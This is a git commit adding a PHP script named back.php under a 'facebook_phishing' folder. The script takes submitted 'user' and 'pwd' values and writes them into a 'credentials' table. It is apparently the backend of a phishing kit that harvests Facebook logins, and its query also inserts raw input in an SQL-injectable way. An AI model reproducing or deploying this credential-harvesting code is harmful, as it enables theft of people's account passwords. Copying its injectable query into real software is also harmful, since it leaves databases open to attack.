962611196c47d6f4b9d92e2c3bdc7e8d3cdce0f1
Sanjay <66213857+nsanjay24@users.noreply.github.com>
2024-05-25 10:37:26 +0530

    Add files via upload

---
+++ facebook_phishing/back.php
@@ -0,0 +1,22 @@
+<?php
+
+
+$db_host = 'localhost';
+$db_username = 'root';
+$db_password = '';
+$db_user = 'facebook';
+
+$email = $_REQUEST['user'];
+$pwd = $_REQUEST['pwd'];
+
+$conn = mysqli_connect($db_host,$db_username,$db_password,$db_user);
+
+if($conn==true){
+    $sql = "INSERT INTO `credentials`(`email`, `password`) VALUES ('$email','$pwd')";
+}
+
+if (mysqli_query($conn, $sql)) {
+    echo "New record created";
+}
+
+?>
